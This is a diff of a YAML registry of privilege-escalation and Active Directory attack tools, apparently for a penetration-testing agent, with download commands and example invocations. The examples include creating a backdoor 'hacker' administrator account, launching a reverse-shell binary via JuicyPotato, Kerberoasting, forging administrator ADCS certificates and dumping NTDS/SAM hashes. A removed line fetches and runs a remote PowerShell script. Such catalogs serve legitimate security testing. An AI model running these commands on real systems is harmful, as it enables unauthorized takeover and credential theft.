@@ -1,67 +1,200 @@
+# === Enumeration Tools ===
+
 linpeas:
-  description: "Linux Privilege Escalation Awesome Script - comprehensive local privilege escalation audit"
+  description: "Linux Privilege Escalation Awesome Script — comprehensive local audit covering SUID, sudo, cron, capabilities, network, and more"
   category: "enumeration"
-  install_cmd: "apt-get install -y linpeas"
-  verify_cmd: "which linpeas"
+  platform: "linux"
+  url: "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS"
+  install_cmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh"
+  verify_cmd: "test -f linpeas.sh && echo 'linpeas OK'"
   examples:
-    - "./linpeas.sh"
-    - "./linpeas.sh -a"
+    - "./linpeas.sh -a 2>&1 | tee linpeas.out"
+    - "./linpeas.sh -s -q"
+    - "./linpeas.sh -e"
 
 winpeas:
-  description: "Windows Privilege Escalation Awesome Script - Windows local privilege escalation audit"
+  description: "Windows Privilege Escalation Awesome Script — comprehensive Windows local audit covering services, tokens, registry, credentials"
   category: "enumeration"
-  install_cmd: "apt-get install -y winpeas"
-  verify_cmd: "which winpeas"
+  platform: "windows"
+  url: "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
+  install_cmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe"
+  verify_cmd: "test -f winpeas.exe && echo 'winpeas OK'"
   examples:
-    - "./winpeas.exe"
+    - ".\\winpeas.exe"
+    - ".\\winpeas.exe servicesinfo"
+    - ".\\winpeas.exe quiet systeminfo userinfo"
 
 linux-exploit-suggester:
-  description: "Suggests potential kernel exploits based on kernel version"
-  category: "exploitation"
-  install_cmd: "apt-get install -y linux-exploit-suggester"
-  verify_cmd: "which linux-exploit-suggester"
+  description: "Suggests potential kernel exploits based on kernel version and configuration"
+  category: "enumeration"
+  platform: "linux"
+  url: "https://github.com/The-Z-Labs/linux-exploit-suggester"
+  install_cmd: "curl -fsSL https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh"
+  verify_cmd: "test -f linux-exploit-suggester.sh && echo 'les OK'"
   examples:
     - "./linux-exploit-suggester.sh"
-    - "./linux-exploit-suggester.sh -k 4.4.0"
+    - "./linux-exploit-suggester.sh -k 5.4.0"
 
-sherlock:
-  description: "PowerShell script to find missing software patches for local privilege escalation vulnerabilities"
+windows-exploit-suggester:
+  description: "Compares systeminfo output against Microsoft patch bulletins to find missing patches"
   category: "enumeration"
-  install_cmd: "apt-get install -y sherlock"
-  verify_cmd: "which sherlock"
+  platform: "windows"
+  url: "https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
+  install_cmd: "pip3 install xlrd && git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git"
+  verify_cmd: "python3 Windows-Exploit-Suggester/windows-exploit-suggester.py --help"
   examples:
-    - "powershell.exe -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://target/sherlock.ps1'); Sherlock\""
-
-gtfobins:
-  description: "GTFOBins - Unix binaries that can be exploited to bypass security restrictions"
-  category: "exploitation"
-  install_cmd: "apt-get install -y gtfobins"
-  verify_cmd: "which gtfobins"
-  examples:
-    - "gtfobins sudo"  # Check sudo exploitation options
-    - "gtfobins tar"   # Check tar exploitation options
-
-lse:
-  description: "Linux Smart Enumeration - enumeration with smart detection of security issues"
-  category: "enumeration"
-  install_cmd: "apt-get install -y lse"
-  verify_cmd: "which lse"
-  examples:
-    - "./lse.sh"
-    - "./lse.sh -l 1"
+    - "python3 windows-exploit-suggester.py --update"
+    - "python3 windows-exploit-suggester.py --database 2024-db.xlsx --systeminfo sysinfo.txt"
 
 pspy:
-  description: "Monitor processes without root permissions - useful for cron job monitoring"
+  description: "Monitor Linux processes without root — detect cron jobs, scripts, and commands run by other users"
   category: "enumeration"
-  install_cmd: "apt-get install -y pspy"
-  verify_cmd: "which pspy"
+  platform: "linux"
+  url: "https://github.com/DominicBreuker/pspy"
+  install_cmd: "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64 && chmod +x pspy64"
+  verify_cmd: "test -f pspy64 && echo 'pspy OK'"
   examples:
     - "./pspy64"
     - "./pspy64 -pf -i 1000"
+    - "./pspy64 -r /tmp -r /home"
+
+seatbelt:
+  description: "C# security audit tool — performs host security checks covering OS info, Defender, DLLs, credentials, tokens"
+  category: "enumeration"
+  platform: "windows"
+  url: "https://github.com/GhostPack/Seatbelt"
+  install_cmd: "git clone https://github.com/GhostPack/Seatbelt.git"
+  verify_cmd: "test -f Seatbelt.exe && echo 'Seatbelt OK'"
+  examples:
+    - ".\\Seatbelt.exe -group=all -full"
+    - ".\\Seatbelt.exe TokenPrivileges DLLs MappedDrives"
+    - ".\\Seatbelt.exe -group=user -outputfile=seatbelt.json"
+
+beroot:
+  description: "Automated privilege escalation path checker for Windows and Linux"
+  category: "enumeration"
+  platform: "cross-platform"
+  url: "https://github.com/AlessandroZ/BeRoot"
+  install_cmd: "git clone https://github.com/AlessandroZ/BeRoot.git"
+  verify_cmd: "python3 BeRoot/Linux/beroot.py --help"
+  examples:
+    - "python3 beroot.py"
+
+# === Windows Exploitation Tools ===
+
+powerup:
+  description: "PowerShell privesc audit script — finds service misconfigs, unquoted paths, DLL hijack, AlwaysInstallElevated"
+  category: "exploitation"
+  platform: "windows"
+  url: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
+  install_cmd: "curl -fsSL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1"
+  verify_cmd: "test -f PowerUp.ps1 && echo 'PowerUp OK'"
+  examples:
+    - "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""
+    - "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-ServiceUnquoted\""
+    - "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-ModifiableService\""
+
+sharpup:
+  description: "C# port of PowerUp — .NET assembly for privesc checks without PowerShell"
+  category: "exploitation"
+  platform: "windows"
+  url: "https://github.com/GhostPack/SharpUp"
+  install_cmd: "git clone https://github.com/GhostPack/SharpUp.git"
+  verify_cmd: "test -f SharpUp.exe && echo 'SharpUp OK'"
+  examples:
+    - ".\\SharpUp.exe audit"
+    - ".\\SharpUp.exe ModifiableServices"
+
+printspoofer:
+  description: "Exploit SeImpersonatePrivilege via Print Spooler — Windows 10 / Server 2016-2019"
+  category: "exploitation"
+  platform: "windows"
+  url: "https://github.com/itm4n/PrintSpoofer"
+  install_cmd: "curl -fsSL https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -o PrintSpoofer.exe"
+  verify_cmd: "test -f PrintSpoofer.exe && echo 'PrintSpoofer OK'"
+  examples:
+    - ".\\PrintSpoofer.exe -i -c cmd"
+    - ".\\PrintSpoofer.exe -i -c powershell.exe"
+    - ".\\PrintSpoofer.exe -c \"cmd /c whoami > C:\\temp\\proof.txt\""
+
+godpotato:
+  description: "SeImpersonatePrivilege exploit — works on Windows 8 through 11 and Server 2012-2022"
+  category: "exploitation"
+  platform: "windows"
+  url: "https://github.com/BeichenDream/GodPotato"
+  install_cmd: "curl -fsSL https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -o GodPotato.exe"
+  verify_cmd: "test -f GodPotato.exe && echo 'GodPotato OK'"
+  examples:
+    - ".\\GodPotato.exe -cmd \"cmd /c whoami\""
+    - ".\\GodPotato.exe -cmd \"cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add\""
+
+juicypotato:
+  description: "SeImpersonatePrivilege exploit via DCOM — Windows 7-10, Server 2008-2016"
+  category: "exploitation"
+  platform: "windows"
+  url: "https://github.com/ohpe/juicy-potato"
+  install_cmd: "curl -fsSL https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe -o JuicyPotato.exe"
+  verify_cmd: "test -f JuicyPotato.exe && echo 'JuicyPotato OK'"
+  examples:
+    - ".\\JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami\" -t *"
+    - ".\\JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c C:\\temp\\rev.exe\" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}"
+
+# === AD / Impacket Tools ===
+
+certipy:
+  description: "Active Directory Certificate Services (ADCS) enumeration and exploitation — ESC1-ESC11"
+  category: "exploitation"
+  platform: "cross-platform"
+  url: "https://github.com/ly4k/Certipy"
+  install_cmd: "pip3 install certipy-ad"
+  verify_cmd: "certipy --version"
+  examples:
+    - "certipy find -u user@domain.local -p password -dc-ip 10.10.10.1 -vulnerable"
+    - "certipy req -u user@domain.local -p password -ca CORP-CA -template VulnTemplate -upn administrator@domain.local"
+    - "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1"
+
+getuserspns:
+  description: "Impacket GetUserSPNs.py — Kerberoasting: request TGS tickets for service accounts"
+  category: "exploitation"
+  platform: "cross-platform"
+  url: "https://github.com/fortra/impacket"
+  install_cmd: "pip3 install impacket"
+  verify_cmd: "GetUserSPNs.py --help 2>&1 | head -1"
+  examples:
+    - "GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password"
+    - "GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user -hashes :ntlmhash"
+    - "GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password -outputfile tgs.txt"
+
+getnpusers:
+  description: "Impacket GetNPUsers.py — AS-REP Roasting: find accounts without Kerberos pre-auth"
+  category: "exploitation"
+  platform: "cross-platform"
+  url: "https://github.com/fortra/impacket"
+  install_cmd: "pip3 install impacket"
+  verify_cmd: "GetNPUsers.py --help 2>&1 | head -1"
+  examples:
+    - "GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat"
+    - "GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.1 -request"
+
+secretsdump:
+  description: "Impacket secretsdump.py — DCSync, SAM/SYSTEM extraction, NTDS.dit dumping"
+  category: "exploitation"
+  platform: "cross-platform"
+  url: "https://github.com/fortra/impacket"
+  install_cmd: "pip3 install impacket"
+  verify_cmd: "secretsdump.py --help 2>&1 | head -1"
+  examples:
+    - "secretsdump.py domain.local/admin:password@10.10.10.1"
+    - "secretsdump.py -sam sam -system system LOCAL"
+    - "secretsdump.py -ntds ntds.dit -system system LOCAL"
+    - "secretsdump.py domain.local/admin@10.10.10.1 -hashes :ntlmhash -just-dc-ntlm"
+
+# === Utility ===
 
 summarize_peas:
-  description: "Summarize LinPEAS/WinPEAS output into JSON highlights"
-  category: "enumeration"
+  description: "Parse LinPEAS/WinPEAS output into structured JSON highlights for analysis"
+  category: "utility"
+  platform: "cross-platform"
   install_cmd: "python3 --version"
   verify_cmd: "python3 skills/privilege_escalation/scripts/summarize_peas.py --help"
   examples:
